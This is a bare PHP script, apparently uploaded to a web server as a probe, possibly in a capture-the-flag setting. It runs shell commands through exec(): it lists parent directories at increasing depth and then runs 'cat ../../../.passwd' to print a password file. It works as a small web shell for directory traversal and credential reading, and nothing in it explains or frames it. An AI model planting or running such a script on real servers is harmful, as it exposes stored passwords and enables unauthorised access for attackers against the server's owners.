<?php

$string = "ls -a ";
$i = 0;

while($i < 7) {
    echo "<br/>-----------------\n<br/>";
    echo myexec($string);
    $i++;
    $string = $string . "../";
}

echo "<br/> Hello : <br/>";
myexec("ls -a ../../../");

echo "<br/> Hello : <br/>";
myexec("cat ../../../.passwd");


function myexec($mystring) {
    $output = "";
    exec($mystring , $output);
    var_dump($output);
}

?>
